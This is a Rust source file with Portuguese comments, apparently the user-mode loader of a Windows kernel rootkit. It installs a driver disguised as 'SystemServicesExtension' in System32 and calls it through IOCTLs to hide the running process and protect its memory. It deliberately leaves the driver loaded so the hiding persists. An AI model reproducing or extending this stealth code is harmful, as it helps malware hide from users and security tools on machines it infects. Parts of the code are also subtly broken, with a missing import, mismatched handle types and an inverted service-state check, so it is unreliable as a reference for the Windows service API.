use std::io::{Error, Result};
use std::mem;
use std::process;
use std::ptr::null_mut;
use windows::{
    Win32::{
        Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS, STATUS_SUCCESS},
        Storage::FileSystem::{
            CreateFileA, FILE_ACCESS_RIGHTS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_MODE, FILE_SHARE_READ,
            FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            IO::{DeviceIoControl, OVERLAPPED},
            Services::{
                CreateServiceA, DeleteService, OpenSCManagerA, OpenServiceA,
                SERVICE_ACCESS_RIGHTS, SERVICE_AUTO_START, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                SERVICE_KERNEL_DRIVER, SERVICE_START, SERVICE_STOP, SC_HANDLE, SC_MANAGER_ALL_ACCESS,
                SC_MANAGER_CREATE_SERVICE, SC_MANAGER_HANDLE, SERVICE_STATUS, START_TYPE, CONTROLS_ACCEPTED,
                SERVICE_STATUS_PROCESS, SERVICE_STATUS_TYPE, SERVICE_CONFIG_FAILURE_ACTIONS,
                CloseServiceHandle, QueryServiceStatus, StartServiceA, ControlService,
                SERVICE_CONTROL_STOP, StartServiceCtrlDispatcherA, OPEN_SC_MANAGER_FLAGS,
                ENUM_SERVICE_STATE, SERVICE_STATUS_HANDLE,
            },
        },
    },
};

// Definir códigos de controle
const FILE_DEVICE_UNKNOWN: u32 = 0x22;
const FILE_ANY_ACCESS: u32 = 0;
const METHOD_BUFFERED: u32 = 0;

const IOCTL_BASE: u32 = 0x800;
const IOCTL_HIDE_PROCESS: u32 = CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTL_BASE + 1, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_PROTECT_MEMORY: u32 = CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTL_BASE + 2, METHOD_BUFFERED, FILE_ANY_ACCESS);
const IOCTL_CHECK_SECURITY: u32 = CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTL_BASE + 3, METHOD_BUFFERED, FILE_ANY_ACCESS);

// Helper para criar códigos de controle IOCTL
fn CTL_CODE(device_type: u32, function: u32, method: u32, access: u32) -> u32 {
    (device_type << 16) | (access << 14) | (function << 2) | method
}

// Estruturas para comunicação com o driver
#[repr(C)]
struct HideRequest {
    pid: u32,
    hide: bool,
}

#[repr(C)]
struct MemoryProtectionRequest {
    pid: u32,
    address: u64,
    size: usize,
}

// Gerenciador do serviço de driver
pub struct DriverService {
    driver_path: String,
    service_name: String,
    device_path: String,
    device_handle: Option<HANDLE>,
    service_handle: Option<SC_HANDLE>,
    manager_handle: Option<SC_MANAGER_HANDLE>,
}

impl DriverService {
    pub fn new(driver_path: &str, service_name: &str, device_path: &str) -> Self {
        Self {
            driver_path: driver_path.to_string(),
            service_name: service_name.to_string(),
            device_path: device_path.to_string(),
            device_handle: None,
            service_handle: None,
            manager_handle: None,
        }
    }

    pub fn install_and_start(&mut self) -> Result<()> {
        self.install_service()?;
        self.start_service()?;
        self.open_device()?;
        Ok(())
    }

    fn install_service(&mut self) -> Result<()> {
        unsafe {
            // Abrir SCM
            let manager = OpenSCManagerA(
                None,
                None,
                SC_MANAGER_CREATE_SERVICE,
            );

            if manager == SC_HANDLE(0) {
                return Err(Error::last_os_error());
            }

            self.manager_handle = Some(manager);

            // Verificar se o serviço já existe
            let existing_service = OpenServiceA(
                manager,
                &self.service_name,
                SERVICE_ACCESS_RIGHTS(DELETE.0),
            );

            if existing_service != SC_HANDLE(0) {
                // Remover serviço existente
                DeleteService(existing_service);
                CloseServiceHandle(existing_service);
            }

            // Criar serviço
            let service = CreateServiceA(
                manager,
                &self.service_name,
                &self.service_name,
                SERVICE_ACCESS_RIGHTS::all(),
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL,
                &self.driver_path,
                None,
                None,
                None,
                None,
                None,
            );

            if service == SC_HANDLE(0) {
                return Err(Error::last_os_error());
            }

            self.service_handle = Some(service);
            Ok(())
        }
    }

    fn start_service(&self) -> Result<()> {
        unsafe {
            if let Some(service) = self.service_handle {
                // Verificar status atual
                let mut status = SERVICE_STATUS::default();
                if QueryServiceStatus(service, &mut status) != 0 {
                    if status.dwCurrentState != SERVICE_STATUS_TYPE(1) {
                        // Já está em execução
                        return Ok(());
                    }
                }

                // Iniciar serviço
                if StartServiceA(service, &[]) == 0 {
                    let error = GetLastError();
                    if error.0 == 1056 {
                        // Serviço já está rodando
                        return Ok(());
                    }
                    return Err(Error::last_os_error());
                }
            } else {
                return Err(Error::new(std::io::ErrorKind::NotFound, "Service handle not found"));
            }
            Ok(())
        }
    }

    fn open_device(&mut self) -> Result<()> {
        unsafe {
            let device = CreateFileA(
                &self.device_path,
                FILE_ACCESS_RIGHTS(0xC0000000), // GENERIC_READ | GENERIC_WRITE
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            );

            if device == INVALID_HANDLE_VALUE {
                return Err(Error::last_os_error());
            }

            self.device_handle = Some(device);
            Ok(())
        }
    }

    pub fn hide_process(&self, pid: u32) -> Result<()> {
        unsafe {
            if let Some(device) = self.device_handle {
                let mut request = HideRequest {
                    pid,
                    hide: true,
                };

                let mut bytes_returned = 0;

                if DeviceIoControl(
                    device,
                    IOCTL_HIDE_PROCESS,
                    Some(&mut request as *mut _ as *mut _),
                    mem::size_of::<HideRequest>() as u32,
                    None,
                    0,
                    Some(&mut bytes_returned),
                    None,
                ) == 0 {
                    return Err(Error::last_os_error());
                }
            } else {
                return Err(Error::new(std::io::ErrorKind::NotFound, "Device handle not found"));
            }
            Ok(())
        }
    }

    pub fn protect_memory(&self, pid: u32, address: u64, size: usize) -> Result<()> {
        unsafe {
            if let Some(device) = self.device_handle {
                let mut request = MemoryProtectionRequest {
                    pid,
                    address,
                    size,
                };

                let mut bytes_returned = 0;

                if DeviceIoControl(
                    device,
                    IOCTL_PROTECT_MEMORY,
                    Some(&mut request as *mut _ as *mut _),
                    mem::size_of::<MemoryProtectionRequest>() as u32,
                    None,
                    0,
                    Some(&mut bytes_returned),
                    None,
                ) == 0 {
                    return Err(Error::last_os_error());
                }
            } else {
                return Err(Error::new(std::io::ErrorKind::NotFound, "Device handle not found"));
            }
            Ok(())
        }
    }

    pub fn check_security(&self) -> Result<bool> {
        unsafe {
            if let Some(device) = self.device_handle {
                let mut result = 0u32;
                let mut bytes_returned = 0;

                if DeviceIoControl(
                    device,
                    IOCTL_CHECK_SECURITY,
                    None,
                    0,
                    Some(&mut result as *mut _ as *mut _),
                    mem::size_of::<u32>() as u32,
                    Some(&mut bytes_returned),
                    None,
                ) == 0 {
                    return Err(Error::last_os_error());
                }

                return Ok(result != 0);
            } else {
                return Err(Error::new(std::io::ErrorKind::NotFound, "Device handle not found"));
            }
        }
    }

    pub fn unload(&mut self) -> Result<()> {
        unsafe {
            // Fechar dispositivo
            if let Some(device) = self.device_handle.take() {
                CloseHandle(device);
            }

            // Parar serviço
            if let Some(service) = self.service_handle.take() {
                let mut status = SERVICE_STATUS::default();
                ControlService(service, SERVICE_CONTROL_STOP, &mut status);
                CloseServiceHandle(service);
            }

            // Fechar gerenciador
            if let Some(manager) = self.manager_handle.take() {
                CloseServiceHandle(manager);
            }

            Ok(())
        }
    }
}

impl Drop for DriverService {
    fn drop(&mut self) {
        let _ = self.unload();
    }
}

// Funções de conveniência
pub fn hide_current_process() -> Result<()> {
    let mut driver = DriverService::new(
        "C:\\Windows\\System32\\drivers\\SystemServicesExtension.sys",
        "SystemServicesExtension",
        "\\\\.\\SystemServicesExtension",
    );

    driver.install_and_start()?;
    driver.hide_process(process::id())?;
    
    // Não fazemos unload para manter o driver ativo
    // O driver será removido na reinicialização do sistema
    std::mem::forget(driver);
    
    Ok(())
}

pub fn protect_memory_region(address: u64, size: usize) -> Result<()> {
    let mut driver = DriverService::new(
        "C:\\Windows\\System32\\drivers\\SystemServicesExtension.sys",
        "SystemServicesExtension",
        "\\\\.\\SystemServicesExtension",
    );

    driver.install_and_start()?;
    driver.protect_memory(process::id(), address, size)?;
    
    // Não fazemos unload para manter o driver ativo
    std::mem::forget(driver);
    
    Ok(())
}

pub fn is_system_secure() -> Result<bool> {
    let mut driver = DriverService::new(
        "C:\\Windows\\System32\\drivers\\SystemServicesExtension.sys",
        "SystemServicesExtension",
        "\\\\.\\SystemServicesExtension",
    );

    driver.install_and_start()?;
    let result = driver.check_security()?;
    
    // Aqui podemos fazer unload, pois é apenas uma verificação
    driver.unload()?;
    
    Ok(result)
}